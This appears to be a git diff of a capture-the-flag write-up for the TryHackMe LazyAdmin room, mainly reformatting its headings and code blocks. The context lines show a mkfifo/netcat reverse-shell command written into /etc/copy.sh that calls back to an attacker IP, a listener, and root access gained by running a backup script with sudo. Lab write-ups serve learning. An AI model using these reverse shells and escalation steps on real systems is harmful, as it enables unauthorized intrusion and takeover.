@@ -109,6 +109,8 @@ www-data
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 444 >/tmp/f" > /etc/copy.sh
 ```
 
+### listener 
+```
 └─$ nc -lnvp 4444   
 listening on [any] 4444 ...
 connect to [10.18.70.19] from (UNKNOWN) [10.10.129.83] 40224
@@ -121,8 +123,9 @@ $ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc 10.18.70.19 5554 >/tmp/f
 $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 5554 > /tmp/f" > /etc/copy.sh
 $ sudo /usr/bin/perl /home/itguy/backup.pl
+```
 
-# I created another listening port and upon running I am successfully become root
+### I created another listening port and upon running I am successfully become root
 ```
 ┌──(aaron㉿kali)-[~/thm/lazyadmin]
 └─$ nc -lnvp 5554
@@ -136,7 +139,6 @@ ls
 bin
 boot
 cdrom
-
 var
 vmlinuz
 vmlinuz.old
